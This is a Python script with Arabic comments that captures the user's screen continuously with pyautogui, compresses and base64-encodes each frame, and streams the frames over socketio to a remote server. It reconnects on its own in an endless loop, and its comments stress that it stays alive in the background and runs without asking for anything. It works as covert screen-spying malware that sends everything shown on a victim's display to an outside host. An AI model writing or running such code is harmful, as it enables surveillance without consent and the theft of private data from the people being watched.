import pyautogui
import io
import base64
import time
import socketio

class Client:
    def __init__(self):
        # استخدام بروتوكول wss المشفر لخطط Render المجانية لضمان استقرار البث
        self.server_url = "https://onrender.com"
        self.sio = socketio.Client()
        
        @self.sio.event
        def connect():
            print("[+] Connected to stream server successfully!")
            # بدء بث اللقطات فور إتمام الاتصال بنجاح
            self.start_streaming()

        @self.sio.event
        def disconnect():
            print("[-] Disconnected from server. Retrying...")

    def capture_screen(self):
        # لقطة شاشة مضغوطة بجودة 35% لسرعة نقل خارقة (FPS عالي)
        screenshot = pyautogui.screenshot()
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format='JPEG', quality=35)
        return base64.b64encode(img_bytes.getvalue()).decode('utf-8')
    
    def start_streaming(self):
        print("[+] Screen streaming started...")
        while self.sio.connected:
            try:
                img_b64 = self.capture_screen()
                # إرسال الصورة عبر قناة البث السريع
                self.sio.emit('video_stream', {'image': img_b64})
                # تأخير 0.05 ثانية لتدفق فيديو سلس للغاية
                time.sleep(0.05)
            except Exception as e:
                print(f"[-] Stream error: {e}")
                break

    def connect_and_run(self):
        while True:
            if not self.sio.connected:
                try:
                    print(f"[*] Attempting to connect to: {self.server_url}")
                    self.sio.connect(self.server_url, transports=['websocket'])
                    # هذا السطر السحري يمنع الكود من إغلاق نفسه ويحافظ عليه حياً في الخلفية
                    self.sio.wait() 
                except Exception as e:
                    print(f"[-] Connection failed: {e}. Retrying in 5 seconds...")
                    time.sleep(5)

if __name__ == '__main__':
    client = Client()
    # تشغيل تلقائي ومستمر دون طلب الرابط
    client.connect_and_run()
